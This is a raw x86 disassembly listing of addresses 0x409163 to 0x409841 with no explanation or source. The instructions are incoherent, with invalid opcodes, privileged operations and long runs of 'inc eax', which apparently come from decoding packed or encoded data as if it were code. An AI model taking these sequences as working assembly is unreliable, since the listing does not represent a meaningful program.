  409163:	mov    gs:0xc5526e33,eax
  409169:	inc    ecx
  40916a:	inc    eax
  40916b:	je     0x4091ec
  40916d:	cwde   
  40916e:	fmul   st(1),st
  409170:	cmp    DWORD PTR [eax+0x5221870f],eax
  409176:	pop    ebp
  409177:	test   al,0x63
  409179:	ret    
  40917a:	inc    eax
  40917b:	bound  ebx,QWORD PTR [eax+eax*2]
  40917e:	inc    eax
  40917f:	inc    eax
  409180:	inc    eax
  409181:	inc    eax
  409182:	inc    eax
  409183:	inc    eax
  409184:	inc    eax
  409185:	inc    eax
  409186:	inc    eax
  409187:	bound  eax,QWORD PTR [ebp+0x76]
  40918a:	push   eax
  40918b:	inc    ecx
  40918c:	or     DWORD PTR [ebx-0x65daf3dd],edx
  409192:	and    al,0x41
  409194:	inc    eax
  409195:	dec    esi
  409196:	dec    esi
  409197:	inc    eax
  409198:	inc    eax
  409199:	inc    eax
  40919a:	inc    eax
  40919b:	inc    eax
  40919c:	inc    eax
  40919d:	inc    eax
  40919e:	inc    eax
  40919f:	add    BYTE PTR [esi+0x72],ah
  4091a2:	push   ebp
  4091a3:	clc    
  4091a4:	hlt    
  4091a5:	adc    al,0xd1
  4091a7:	and    DWORD PTR [ebx],esi
  4091a9:	nop
  4091aa:	data16 sub BYTE PTR [ebx-0x67b6b9c0],cl
  4091b1:	(bad)  
  4091b2:	rcl    BYTE PTR [esi],1
  4091b4:	test   al,0x3
  4091b6:	icebp  
  4091b7:	and    dl,BYTE PTR [edx+0x78]
  4091ba:	arpl   ax,sp
  4091bc:	adc    DWORD PTR [eax+0x4a],eax
  4091bf:	(bad)  
  4091c0:	jmp    0x409180
  4091c2:	leave  
  4091c3:	bound  esi,QWORD PTR [eax+0x40404040]
  4091c9:	inc    eax
  4091ca:	inc    eax
  4091cb:	and    eax,0x15404040
  4091d0:	push   edx
  4091d1:	and    cl,BYTE PTR [ebp+eiz*1+0x400d5248]
  4091d8:	scas   eax,DWORD PTR es:[edi]
  4091d9:	inc    ebp
  4091da:	dec    eax
  4091db:	dec    eax
  4091dc:	bound  edi,QWORD PTR [eax]
  4091de:	retf   
  4091df:	adc    ah,BYTE PTR [edi-0x5648c35f]
  4091e5:	sbb    al,0xb0
  4091e7:	inc    eax
  4091e8:	inc    eax
  4091e9:	dec    edx
  4091ea:	inc    eax
  4091eb:	inc    eax
  4091ec:	inc    eax
  4091ed:	inc    eax
  4091ee:	inc    eax
  4091ef:	inc    eax
  4091f0:	inc    eax
  4091f1:	inc    eax
  4091f2:	inc    eax
  4091f3:	inc    eax
  4091f4:	jl     0x40919e
  4091f6:	xchg   esp,eax
  4091f7:	xchg   ecx,eax
  4091f8:	retf   
  4091f9:	adc    al,0x60
  4091fb:	and    ch,al
  4091fd:	adc    ah,dl
  4091ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409200:	inc    ebp
  409201:	inc    eax
  409202:	in     al,dx
  409203:	and    ebx,DWORD PTR [eax+edi*4-0x7e]
  409207:	bound  eax,QWORD PTR [ecx+0x13]
  40920a:	aad    0x56
  40920c:	out    dx,al
  40920d:	inc    edx
  40920e:	arpl   bx,cx
  409210:	fadd   QWORD PTR [eax+0x40]
  409213:	inc    eax
  409214:	inc    eax
  409215:	inc    eax
  409216:	inc    eax
  409217:	rol    DWORD PTR [eax+0x40],0x40
  40921b:	gs out dx,eax
  40921d:	arpl   WORD PTR [ecx+eiz*8+0x1e],bx
  409221:	leave  
  409222:	push   cs
  409223:	jg     0x409277
  409225:	cmp    al,0x3c
  409227:	hlt    
  409228:	cmc    
  409229:	cdq    
  40922a:	inc    eax
  40922b:	inc    eax
  40922c:	test   eax,0x625a417a
  409231:	dec    edi
  409232:	or     DWORD PTR [ebp+0x5f],esi
  409235:	jmp    0x4091d2
  409237:	inc    eax
  409238:	inc    eax
  409239:	add    BYTE PTR [eax+0x40],al
  40923c:	inc    eax
  40923d:	inc    eax
  40923e:	inc    eax
  40923f:	inc    eax
  409240:	test   eax,0x5140c228
  409245:	mov    ds:0x1045c1ad,al
  40924a:	add    BYTE PTR [edi],bl
  40924c:	xchg   edx,eax
  40924d:	cmp    DWORD PTR [ebx],esi
  40924f:	adc    bl,BYTE PTR [ecx]
  409251:	cwde   
  409252:	xor    al,0x40
  409254:	imul   ebp,DWORD PTR [esi],0x57eac98
  40925a:	adc    BYTE PTR [esi+ebx*2],0x40
  40925e:	inc    eax
  40925f:	inc    eax
  409260:	inc    eax
  409261:	inc    eax
  409262:	inc    eax
  409263:	inc    eax
  409264:	inc    eax
  409265:	inc    eax
  409266:	inc    eax
  409267:	inc    edx
  409268:	push   edx
  409269:	adc    eax,0x40c5cb62
  40926e:	dec    ebx
  40926f:	mov    al,ds:0xf616cda1
  409274:	inc    ecx
  409275:	adc    cl,dl
  409277:	sub    ebp,DWORD PTR [eax+0x4aab2040]
  40927d:	inc    eax
  40927e:	push   edi
  40927f:	push   ebp
  409280:	xor    eax,DWORD PTR [eax+0x40]
  409283:	inc    eax
  409284:	inc    eax
  409285:	inc    eax
  409286:	inc    eax
  409287:	int3   
  409288:	jne    0x4092ca
  40928a:	sub    bh,ah
  40928c:	rol    ah,1
  40928e:	sbb    DWORD PTR [ecx+0x73],esi
  409291:	cwde   
  409292:	inc    ebx
  409293:	and    eax,0x4040524c
  409298:	inc    ebp
  409299:	push   edx
  40929a:	or     al,BYTE PTR [eax+0x0]
  40929d:	rol    DWORD PTR [eax+0x40],0x40
  4092a1:	inc    eax
  4092a2:	add    BYTE PTR [eax-0x58],al
  4092a5:	leave  
  4092a6:	pop    ecx
  4092a7:	adc    dl,al
  4092a9:	and    DWORD PTR [ecx-0x78],esp
  4092ac:	shr    DWORD PTR [eax+0x503340a8],0xfc
  4092b3:	inc    eax
  4092b4:	inc    eax
  4092b5:	inc    eax
  4092b6:	inc    eax
  4092b7:	inc    eax
  4092b8:	inc    eax
  4092b9:	inc    eax
  4092ba:	inc    eax
  4092bb:	inc    DWORD PTR [eax+0x1e]
  4092be:	xchg   edi,eax
  4092bf:	adc    eax,0xa1580312
  4092c4:	data16 xor al,0x62
  4092c7:	retf   
  4092c8:	mov    al,0x40
  4092ca:	fldenv [ebp+0x33]
  4092cd:	and    BYTE PTR [esi+0x44],0x15
  4092d1:	add    eax,0xc5982275
  4092d6:	nop
  4092d7:	add    al,BYTE PTR [ebx+0x40]
  4092da:	xor    BYTE PTR ds:0x4c629152,dh
  4092e0:	outs   dx,BYTE PTR ds:[esi]
  4092e1:	add    al,0x1f
  4092e3:	jg     0x409325
  4092e5:	inc    eax
  4092e6:	inc    eax
  4092e7:	inc    eax
  4092e8:	inc    eax
  4092e9:	inc    eax
  4092ea:	inc    eax
  4092eb:	inc    eax
  4092ec:	inc    eax
  4092ed:	inc    eax
  4092ee:	pushf  
  4092ef:	inc    edx
  4092f0:	pop    edi
  4092f1:	inc    esp
  4092f2:	or     al,0x40
  4092f4:	inc    esi
  4092f5:	mov    ds:0x3c3457b8,al
  4092fa:	inc    ax
  4092fc:	mov    ah,0xfd
  4092fe:	xor    esp,DWORD PTR [edx+ebp*1]
  409301:	mov    al,0x41
  409303:	inc    eax
  409304:	lods   eax,DWORD PTR ds:[esi]
  409305:	and    DWORD PTR [eax+0x680db644],ebx
  40930b:	inc    eax
  40930c:	outs   dx,DWORD PTR ds:[esi]
  40930d:	inc    eax
  40930e:	inc    eax
  40930f:	inc    eax
  409310:	inc    eax
  409311:	inc    eax
  409312:	inc    eax
  409313:	inc    eax
  409314:	inc    eax
  409315:	add    BYTE PTR [edi+0x52],cl
  409318:	enter  0x4362,0x6f
  40931c:	inc    eax
  40931d:	inc    ecx
  40931e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40931f:	jmp    0x409366
  409321:	push   0xffffffc2
  409323:	(bad)  
  409324:	or     al,0xf5
  409326:	pop    ss
  409327:	inc    eax
  409328:	inc    eax
  409329:	inc    eax
  40932a:	inc    eax
  40932b:	inc    eax
  40932c:	inc    eax
  40932d:	and    eax,0x8c404040
  409332:	es xor eax,0xc940124c
  409338:	and    dl,BYTE PTR [esi+0x61]
  40933b:	ror    bl,0x2d
  40933e:	or     eax,0xe62c32d8
  409343:	inc    eax
  409344:	test   al,0x41
  409346:	inc    eax
  409347:	and    DWORD PTR [edi+0x70],ebx
  40934a:	leave  
  40934b:	inc    eax
  40934c:	inc    esp
  40934d:	inc    eax
  40934e:	inc    eax
  40934f:	inc    eax
  409350:	inc    eax
  409351:	inc    eax
  409352:	inc    eax
  409353:	inc    eax
  409354:	inc    eax
  409355:	inc    eax
  409356:	inc    eax
  409357:	push   0xc5e16514
  40935c:	inc    ecx
  40935d:	inc    ebp
  40935e:	add    ebp,DWORD PTR [ecx+0x40]
  409361:	ror    DWORD PTR [eax-0x34],1
  409364:	sub    al,BYTE PTR [ebx-0x2c]
  409367:	aaa    
  409368:	or     BYTE PTR [ecx+eiz*4+0x7e],dl
  40936c:	adc    ch,BYTE PTR [ebp+0x1140b2ac]
  409372:	push   ebp
  409373:	gs test al,0x40
  409376:	inc    eax
  409377:	inc    eax
  409378:	inc    eax
  409379:	inc    eax
  40937a:	inc    eax
  40937b:	rol    DWORD PTR [eax+0x40],0x14
  40937f:	or     eax,0x61406e21
  409384:	xor    edx,DWORD PTR ds:0x406fcb62
  40938a:	jo     0x409405
  40938c:	cwde   
  40938d:	retf   
  40938e:	xor    al,0xc1
  409390:	xor    BYTE PTR [esi],cl
  409392:	sub    esp,DWORD PTR [edx+0x52]
  409395:	inc    ebx
  409396:	rcl    BYTE PTR [eax+eax*2+0x40],cl
  40939a:	add    BYTE PTR [eax+0x40],al
  40939d:	inc    eax
  40939e:	inc    eax
  40939f:	inc    eax
  4093a0:	inc    eax
  4093a1:	retf   0x2e40
  4093a4:	das    
  4093a5:	pop    edi
  4093a6:	cmp    al,0x21
  4093a8:	inc    edx
  4093a9:	les    ecx,FWORD PTR [edi]
  4093ab:	sbb    ecx,DWORD PTR ds:0x93b8748c
  4093b1:	dec    edi
  4093b2:	inc    eax
  4093b3:	jb     0x409416
  4093b5:	dec    eax
  4093b6:	bound  edi,QWORD PTR ds:0x40094834
  4093bc:	inc    eax
  4093bd:	inc    eax
  4093be:	inc    eax
  4093bf:	inc    eax
  4093c0:	inc    eax
  4093c1:	inc    eax
  4093c2:	inc    eax
  4093c3:	inc    eax
  4093c4:	inc    eax
  4093c5:	outs   dx,BYTE PTR ds:[esi]
  4093c6:	jle    0x409404
  4093c8:	xchg   DWORD PTR [ecx],ecx
  4093ca:	dec    eax
  4093cb:	mov    ebx,0x6c6e4140
  4093d0:	pushf  
  4093d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d2:	inc    ebx
  4093d3:	pop    ebx
  4093d4:	adc    al,0xd1
  4093d6:	jecxz  0x4093a5
  4093d8:	mov    al,0x62
  4093da:	and    DWORD PTR [eax-0x7ce36c0],ebp
  4093e0:	inc    eax
  4093e1:	inc    eax
  4093e2:	inc    eax
  4093e3:	inc    eax
  4093e4:	inc    eax
  4093e5:	inc    eax
  4093e6:	int3   
  4093e7:	jne    0x409429
  4093e9:	inc    esp
  4093ea:	jge    0x4093a0
  4093ec:	inc    edx
  4093ed:	add    ebx,DWORD PTR [ebx-0x3b9d81b9]
  4093f3:	adc    eax,0xe36d402a
  4093f8:	push   ebp
  4093f9:	inc    edi
  4093fa:	dec    edi
  4093fb:	inc    ebx
  4093fc:	adc    dl,BYTE PTR ds:0x34335491
  409402:	ror    al,0xb8
  409405:	inc    eax
  409406:	add    cl,al
  409408:	inc    eax
  409409:	inc    eax
  40940a:	inc    eax
  40940b:	inc    eax
  40940c:	add    BYTE PTR [eax+0x40],al
  40940f:	cmp    esp,ecx
  409411:	cwde   
  409412:	nop
  409413:	inc    eax
  409414:	push   esp
  409415:	adc    eax,0x524f1312
  40941a:	ss inc eax
  40941c:	inc    edx
  40941d:	int    0x40
  40941f:	inc    ebp
  409420:	pusha  
  409421:	int    0x21
  409423:	pop    edx
  409424:	xchg   DWORD PTR [eax+0x14],eax
  409427:	adc    DWORD PTR [eax+0x4],esp
  40942a:	mov    esp,0x402a1cb8
  40942f:	inc    eax
  409430:	push   ds
  409431:	data16 sar BYTE PTR ds:0x40404040,0x40
  409439:	inc    eax
  40943a:	inc    eax
  40943b:	inc    eax
  40943c:	inc    DWORD PTR [eax+0x52]
  40943f:	inc    edi
  409440:	adc    esi,DWORD PTR [eax+0x6]
  409443:	xor    eax,DWORD PTR [edi-0x3f]
  409446:	inc    edx
  409447:	inc    edx
  409448:	inc    eax
  409449:	jmp    DWORD PTR [eax]
  40944b:	cwde   
  40944c:	ss inc edi
  40944e:	pop    esp
  40944f:	fmul   DWORD PTR [esi]
  409451:	es je  0x4094a6
  409454:	or     eax,esi
  409456:	xchg   ebp,eax
  409457:	add    eax,DWORD PTR [eax+0x42]
  40945a:	inc    eax
  40945b:	inc    eax
  40945c:	inc    eax
  40945d:	inc    eax
  40945e:	inc    eax
  40945f:	inc    eax
  409460:	inc    eax
  409461:	inc    eax
  409462:	inc    eax
  409463:	inc    eax
  409464:	jl     0x409478
  409466:	test   al,0xd4
  409468:	push   edx
  409469:	stos   DWORD PTR es:[edi],eax
  40946a:	or     DWORD PTR [eax],edx
  40946c:	mov    ds:0x76634150,al
  409471:	dec    ebp
  409472:	inc    eax
  409473:	xor    ch,BYTE PTR [ebp+0x56]
  409476:	sub    ch,BYTE PTR [edx+0x521fd6e7]
  40947c:	dec    edi
  40947d:	xor    eax,DWORD PTR [eax+0x40]
  409480:	inc    eax
  409481:	inc    eax
  409482:	inc    eax
  409483:	inc    eax
  409484:	inc    eax
  409485:	inc    eax
  409486:	add    BYTE PTR [eax+0x40],cl
  409489:	xor    eax,0xe0b14040
  40948e:	cwde   
  40948f:	sub    ah,BYTE PTR [edx-0x58]
  409492:	sub    al,0x14
  409494:	inc    ebp
  409495:	adc    edx,DWORD PTR [edx+0x43]
  409498:	hlt    
  409499:	pop    ebp
  40949a:	dec    ecx
  40949b:	inc    eax
  40949c:	aaa    
  40949d:	in     eax,dx
  40949e:	jo     0x409499
  4094a0:	sub    al,0x40
  4094a2:	inc    eax
  4094a3:	inc    eax
  4094a4:	inc    eax
  4094a5:	inc    eax
  4094a6:	inc    eax
  4094a7:	and    eax,0xd5404040
  4094ac:	bound  edx,QWORD PTR [eax]
  4094ae:	dec    ebp
  4094af:	and    BYTE PTR [eax],cl
  4094b1:	ins    BYTE PTR es:[edi],dx
  4094b2:	adc    BYTE PTR [ebx+0x5],dl
  4094b5:	inc    eax
  4094b6:	jmp    DWORD PTR [eax+0x66]
  4094b9:	arpl   WORD PTR [edx-0x5a],dx
  4094bc:	xchg   DWORD PTR [ecx],ebx
  4094be:	pop    eax
  4094bf:	jmp    0x4040:0x90a8bc33
  4094c6:	inc    eax
  4094c7:	inc    eax
  4094c8:	inc    eax
  4094c9:	inc    eax
  4094ca:	inc    eax
  4094cb:	inc    eax
  4094cc:	inc    eax
  4094cd:	inc    eax
  4094ce:	inc    edi
  4094cf:	inc    eax
  4094d0:	push   ecx
  4094d1:	jb     0x40946b
  4094d3:	inc    ecx
  4094d4:	pop    ebp
  4094d5:	gs xor eax,0x52611812
  4094db:	cmc    
  4094dc:	femms  
  4094de:	add    BYTE PTR [eax+0x11],0x4
  4094e2:	lds    edx,FWORD PTR [edx+0x52]
  4094e5:	sub    al,0x40
  4094e7:	inc    eax
  4094e8:	inc    eax
  4094e9:	inc    eax
  4094ea:	inc    eax
  4094eb:	inc    eax
  4094ec:	rol    DWORD PTR [eax+0x40],0xc5
  4094f0:	add    ebx,DWORD PTR [edi]
  4094f2:	mov    ds:0x3412c0ca,eax
  4094f7:	inc    ebx
  4094f8:	inc    eax
  4094f9:	dec    edx
  4094fa:	inc    edx
  4094fb:	or     DWORD PTR [ecx-0x60],esp
  4094fe:	test   al,0x45
  409500:	add    eax,0xa155a2d5
  409505:	mov    esi,0x4a40dc63
  40950a:	sub    DWORD PTR [ebx],esi
  40950c:	bound  ebp,QWORD PTR [esi]
  40950e:	sbb    DWORD PTR [eax+0x40],eax
  409511:	add    BYTE PTR [eax+0x40],al
  409514:	inc    eax
  409515:	inc    eax
  409516:	inc    eax
  409517:	inc    eax
  409518:	pusha  
  409519:	add    al,0xdf
  40951b:	fcomp  QWORD PTR [eax-0x6d235f79]
  409521:	inc    eax
  409522:	push   0xbcc05266
  409527:	arpl   WORD PTR [ebp+0x40],ax
  40952a:	cmc    
  40952b:	and    edx,ebp
  40952d:	bound  esp,QWORD PTR [edx-0x54]
  409530:	fiadd  WORD PTR [eax+0x69]
  409533:	pop    esi
  409534:	dec    esi
  409535:	adc    dl,BYTE PTR [eax]
  409537:	cwde   
  409538:	push   eax
  409539:	inc    eax
  40953a:	inc    eax
  40953b:	inc    eax
  40953c:	inc    eax
  40953d:	inc    eax
  40953e:	inc    eax
  40953f:	inc    eax
  409540:	inc    eax
  409541:	inc    eax
  409542:	inc    eax
  409543:	adc    al,0x51
  409545:	(bad)  
  409546:	std    
  409547:	pushf  
  409548:	xchg   esp,eax
  409549:	add    eax,0x60404040
  40954e:	inc    esp
  40954f:	adc    eax,0x18996327
  409554:	push   eax
  409555:	stos   BYTE PTR es:[edi],al
  409556:	inc    eax
  409557:	inc    eax
  409558:	inc    eax
  409559:	inc    eax
  40955a:	inc    eax
  40955b:	inc    eax
  40955c:	int3   
  40955d:	jne    0x40959f
  40955f:	sub    al,0x95
  409561:	sbb    al,BYTE PTR [edi+eiz*2+0x60772640]
  409568:	xchg   edi,eax
  409569:	(bad)  
  40956b:	adc    BYTE PTR [eax+edx*2],0xa1
  40956f:	inc    eax
  409570:	add    cl,al
  409572:	inc    eax
  409573:	inc    eax
  409574:	inc    eax
  409575:	inc    eax
  409576:	add    BYTE PTR [eax-0x33],al
  409579:	fs adc eax,0xb340601b
  40957f:	inc    ebx
  409580:	daa    
  409581:	or     ebp,0x216ed1da
  409587:	mov    eax,ds:0x40404040
  40958c:	inc    eax
  40958d:	inc    eax
  40958e:	inc    eax
  40958f:	inc    eax
  409590:	inc    DWORD PTR [eax+0x5e]
  409593:	pushf  
  409594:	and    al,0x52
  409596:	bound  eax,QWORD PTR [eax+0x39]
  409599:	dec    edi
  40959a:	push   ebp
  40959b:	stc    
  40959c:	push   esi
  40959d:	test   al,0x48
  40959f:	push   cs
  4095a0:	mov    ebx,0x62d43321
  4095a5:	xor    al,bh
  4095a7:	inc    eax
  4095a8:	push   0xffffffd2
  4095aa:	cwde   
  4095ab:	xchg   ebx,eax
  4095ac:	out    0xa5,al
  4095ae:	push   edx
  4095af:	(bad)  
  4095b1:	popa   
  4095b2:	push   edx
  4095b3:	inc    eax
  4095b4:	inc    eax
  4095b5:	inc    eax
  4095b6:	inc    eax
  4095b7:	inc    eax
  4095b8:	inc    eax
  4095b9:	inc    eax
  4095ba:	inc    eax
  4095bb:	inc    eax
  4095bc:	inc    eax
  4095bd:	dec    edx
  4095be:	clc    
  4095bf:	(bad)  
  4095c0:	enter  0x3440,0x26
  4095c4:	out    0x25,al
  4095c6:	bound  eax,QWORD PTR [eax]
  4095c8:	and    cl,BYTE PTR [ecx]
  4095ca:	xor    edx,esp
  4095cc:	mov    esp,0x40404091
  4095d1:	inc    eax
  4095d2:	inc    eax
  4095d3:	inc    eax
  4095d4:	inc    eax
  4095d5:	inc    eax
  4095d6:	add    BYTE PTR [edx+0x7940552a],cl
  4095dc:	and    dh,BYTE PTR [ebx]
  4095de:	dec    edx
  4095df:	and    BYTE PTR [eax],dl
  4095e1:	cmp    DWORD PTR [ecx+esi*4],edx
  4095e4:	pop    ecx
  4095e5:	cwde   
  4095e6:	lds    ebx,FWORD PTR [ebx-0x48]
  4095e9:	mov    eax,0x52a14940
  4095ee:	enter  0x4180,0x86
  4095f2:	add    edx,DWORD PTR [ecx+0x40]
  4095f5:	aad    0x4a
  4095f7:	(bad)
  4095fb:	dec    esp
  4095fc:	inc    eax
  4095fd:	inc    eax
  4095fe:	inc    eax
  4095ff:	inc    eax
  409600:	inc    eax
  409601:	inc    eax
  409602:	and    eax,0xe2404040
  409607:	dec    esi
  409608:	and    eax,0x156214f8
  40960d:	lock mov ebx,0x6274c9fd
  409613:	inc    edx
  409614:	inc    eax
  409615:	and    al,0x23
  409617:	inc    esp
  409618:	test   al,0x66
  40961a:	adc    eax,0x134f12d8
  40961f:	sub    al,0x10
  409621:	lods   eax,DWORD PTR ds:[esi]
  409622:	inc    eax
  409623:	inc    eax
  409624:	inc    eax
  409625:	inc    eax
  409626:	inc    eax
  409627:	inc    eax
  409628:	inc    eax
  409629:	inc    eax
  40962a:	inc    eax
  40962b:	inc    eax
  40962c:	int    0x4
  40962e:	inc    eax
  40962f:	shl    DWORD PTR [ecx+0x5a],cl
  409632:	(bad)  
  409633:	cmp    BYTE PTR [esi],ch
  409635:	jb     0x40964b
  409637:	xchg   edx,eax
  409638:	js     0x4096a2
  40963a:	daa    
  40963b:	inc    ebp
  40963c:	push   es
  40963d:	pop    ebx
  40963e:	inc    eax
  40963f:	shl    DWORD PTR [edx],cl
  409641:	in     eax,0x50
  409643:	fsub   DWORD PTR [ebx-0x2a]
  409646:	adc    edi,DWORD PTR [ebx+0x40ad6630]
  40964c:	inc    eax
  40964d:	inc    eax
  40964e:	inc    eax
  40964f:	inc    eax
  409650:	inc    eax
  409651:	rol    DWORD PTR [eax+0x40],0xee
  409655:	test   DWORD PTR [eax+eax*2+0x3d33e417],edx
  40965c:	or     eax,eax
  40965e:	dec    eax
  40965f:	push   cs
  409660:	aas    
  409661:	and    DWORD PTR [eax+0x62636993],ebx
  409667:	inc    eax
  409668:	pop    ds
  409669:	inc    eax
  40966a:	inc    eax
  40966b:	add    BYTE PTR [eax+0x40],al
  40966e:	inc    eax
  40966f:	inc    eax
  409670:	inc    eax
  409671:	inc    eax
  409672:	gs push edx
  409674:	int3   
  409675:	(bad)  
  409676:	lds    ebp,FWORD PTR [ebx+0x9]
  409679:	icebp  
  40967a:	and    DWORD PTR [ebp+0x2c4f5062],esp
  409680:	inc    eax
  409681:	xchg   esi,eax
  409682:	jnp    0x409630
  409684:	jb     0x4096e3
  409686:	inc    eax
  409687:	inc    eax
  409688:	inc    eax
  409689:	inc    eax
  40968a:	inc    eax
  40968b:	inc    eax
  40968c:	inc    eax
  40968d:	inc    eax
  40968e:	inc    eax
  40968f:	inc    eax
  409690:	jecxz  0x4096d3
  409692:	pop    ds
  409693:	xchg   ebx,eax
  409694:	and    DWORD PTR [ebx],esi
  409696:	sbb    al,0xcd
  409698:	sub    edi,DWORD PTR [eax+eax*2+0x6298526b]
  40969f:	imul   ecx,DWORD PTR [ecx+eiz*2+0x14],0x40
  4096a4:	inc    eax
  4096a5:	inc    eax
  4096a6:	inc    eax
  4096a7:	inc    eax
  4096a8:	inc    eax
  4096a9:	int3   
  4096aa:	jne    0x4096ec
  4096ac:	push   ecx
  4096ad:	hlt    
  4096ae:	push   edx
  4096af:	adc    dh,ch
  4096b1:	pop    eax
  4096b2:	pop    ecx
  4096b3:	inc    eax
  4096b4:	sbb    ebp,DWORD PTR [edi]
  4096b6:	sbb    ah,BYTE PTR [eax+0x10753d89]
  4096bc:	inc    eax
  4096bd:	add    cl,al
  4096bf:	inc    eax
  4096c0:	inc    eax
  4096c1:	inc    eax
  4096c2:	inc    eax
  4096c3:	add    BYTE PTR [eax-0xd],al
  4096c6:	es mov esi,fs
  4096c9:	push   esi
  4096ca:	xlat   BYTE PTR ds:[ebx]
  4096cb:	fiadd  DWORD PTR [eax+0x30]
  4096ce:	inc    esp
  4096cf:	inc    esp
  4096d0:	mov    ds:0x1950b35d,al
  4096d5:	xor    al,0xa0
  4096d7:	sub    al,0x67
  4096d9:	cld    
  4096da:	test   al,0x35
  4096dc:	inc    eax
  4096dd:	pop    ss
  4096de:	pusha  
  4096df:	push   esp
  4096e0:	dec    esi
  4096e1:	adc    bh,BYTE PTR [edi+0x40401280]
  4096e7:	inc    eax
  4096e8:	inc    eax
  4096e9:	inc    eax
  4096ea:	inc    eax
  4096eb:	inc    eax
  4096ec:	inc    eax
  4096ed:	inc    DWORD PTR [eax+0x46]
  4096f0:	into   
  4096f1:	out    0xc4,al
  4096f3:	cwde   
  4096f4:	sub    al,ch
  4096f6:	inc    eax
  4096f7:	mov    eax,0x154f9de2
  4096fc:	adc    BYTE PTR [ecx+0x3],al
  4096ff:	mov    ebp,0xcd634401
  409704:	mov    al,0x58
  409706:	inc    eax
  409707:	add    eax,DWORD PTR [eax+0x40]
  40970a:	inc    eax
  40970b:	inc    eax
  40970c:	inc    eax
  40970d:	inc    eax
  40970e:	inc    eax
  40970f:	inc    eax
  409710:	inc    eax
  409711:	inc    eax
  409712:	push   ebp
  409713:	sub    al,0xe3
  409715:	inc    ecx
  409716:	inc    esp
  409717:	enter  0x8f05,0x61
  40971b:	push   edx
  40971c:	shl    BYTE PTR gs:[edx+eiz*2+0x40],1
  409721:	xor    DWORD PTR [edi-0x6d],edi
  409724:	push   ebx
  409725:	cmp    al,0x74
  409727:	dec    ecx
  409728:	add    al,0x45
  40972a:	cmp    edi,DWORD PTR [ecx-0x579d9a34]
  409730:	inc    eax
  409731:	push   ecx
  409732:	or     BYTE PTR [ebx+0x40404040],al
  409738:	inc    eax
  409739:	inc    eax
  40973a:	inc    eax
  40973b:	inc    eax
  40973c:	add    BYTE PTR [ebx],dh
  40973e:	inc    eax
  40973f:	adc    ah,BYTE PTR [edx+0x40]
  409742:	dec    ecx
  409743:	sub    edx,eax
  409745:	mov    eax,0x4033983f
  40974a:	xchg   edx,eax
  40974b:	pop    ss
  40974c:	push   edx
  40974d:	test   al,0x55
  40974f:	adc    eax,0x40401473
  409754:	inc    eax
  409755:	inc    eax
  409756:	inc    eax
  409757:	inc    eax
  409758:	and    eax,0x27404040
  40975d:	push   edx
  40975e:	aad    0x10
  409760:	(bad)  
  409761:	fisub  WORD PTR [ebx+0x40]
  409764:	pop    ebx
  409765:	addr16 adc al,0xbc
  409768:	pop    es
  409769:	jg     0x40978c
  40976b:	adc    eax,DWORD PTR [eax+0x40]
  40976e:	inc    eax
  40976f:	inc    eax
  409770:	inc    eax
  409771:	inc    eax
  409772:	inc    eax
  409773:	inc    eax
  409774:	inc    eax
  409775:	inc    eax
  409776:	jno    0x4097ba
  409778:	in     eax,dx
  409779:	inc    edx
  40977a:	rcl    BYTE PTR [edx+ebx*8+0x40],1
  40977e:	bound  esp,QWORD PTR [ebx]
  409780:	inc    esp
  409781:	sub    esp,DWORD PTR [ebx+0x0]
  409784:	test   al,0x9
  409786:	adc    DWORD PTR [edi],eax
  409788:	inc    eax
  409789:	inc    eax
  40978a:	inc    eax
  40978b:	inc    eax
  40978c:	inc    eax
  40978d:	inc    eax
  40978e:	rol    DWORD PTR [eax+0x40],0x2c
  409792:	rcr    BYTE PTR [ebp+0x2340632a],0xe9
  409799:	dec    esi
  40979a:	lds    ebx,FWORD PTR [bx+si+0xca9]
  40979f:	rcl    DWORD PTR [eax+0x35],cl
  4097a2:	les    edi,FWORD PTR [ecx*1+0x2f3740a8]
  4097a9:	lea    ecx,[edi-0x4a]
  4097ac:	leave  
  4097ad:	inc    edx
  4097ae:	inc    eax
  4097af:	inc    eax
  4097b0:	add    BYTE PTR [eax+0x40],al
  4097b3:	inc    eax
  4097b4:	inc    eax
  4097b5:	inc    eax
  4097b6:	inc    eax
  4097b7:	adc    al,0xa
  4097b9:	dec    esp
  4097ba:	inc    esp
  4097bb:	inc    eax
  4097bc:	dec    esp
  4097bd:	dec    edx
  4097be:	sub    al,BYTE PTR [eax+0x32]
  4097c1:	out    0x2c,al
  4097c3:	mov    esp,0x10104347
  4097c8:	and    DWORD PTR [edi+0x4c],ebp
  4097cb:	inc    edx
  4097cc:	leave  
  4097cd:	push   ss
  4097ce:	mov    eax,0xc54c6040
  4097d3:	jl     0x4097c4
  4097d5:	fadd   QWORD PTR [ebx+0x19]
  4097d8:	pop    ecx
  4097d9:	and    esp,DWORD PTR [ecx]
  4097db:	inc    eax
  4097dc:	inc    eax
  4097dd:	inc    eax
  4097de:	inc    eax
  4097df:	inc    eax
  4097e0:	inc    eax
  4097e1:	inc    eax
  4097e2:	inc    eax
  4097e3:	inc    eax
  4097e4:	inc    eax
  4097e5:	fsubr  DWORD PTR [eax+0x44406763]
  4097eb:	adc    edi,esi
  4097ed:	arpl   WORD PTR [ecx],dx
  4097ef:	fcom   QWORD PTR [eax+0x4422b212]
  4097f5:	jno    0x40983f
  4097f7:	mov    WORD PTR [edx+0x40],fs
  4097fa:	inc    eax
  4097fb:	inc    eax
  4097fc:	inc    eax
  4097fd:	inc    eax
  4097fe:	inc    eax
  4097ff:	int3   
  409800:	jne    0x409842
  409802:	inc    eax
  409803:	mov    al,ds:0x41342cbb
  409808:	aaa    
  409809:	inc    eax
  40980a:	add    eax,DWORD PTR [ecx+0x7f]
  40980d:	dec    edx
  40980e:	sub    eax,0x40c79047
  409813:	push   eax
  409814:	inc    eax
  409815:	add    cl,al
  409817:	inc    eax
  409818:	inc    eax
  409819:	inc    eax
  40981a:	inc    eax
  40981b:	add    BYTE PTR [eax+0x48],al
  40981e:	aad    0x6e
  409820:	cmp    BYTE PTR [edx+0x35],dl
  409823:	inc    eax
  409824:	js     0x409846
  409826:	adc    al,BYTE PTR [eax-0x3b]
  409829:	ret    0x4062
  40982c:	inc    eax
  40982d:	inc    eax
  40982e:	inc    eax
  40982f:	inc    eax
  409830:	inc    eax
  409831:	inc    eax
  409832:	inc    eax
  409833:	inc    DWORD PTR [eax+0x40]
  409836:	retf   0xfe25
  409839:	bound  ecx,QWORD PTR [eax+0x1c74054f]
  40983f:	jbe    0x409885
  409841:	inc    esp
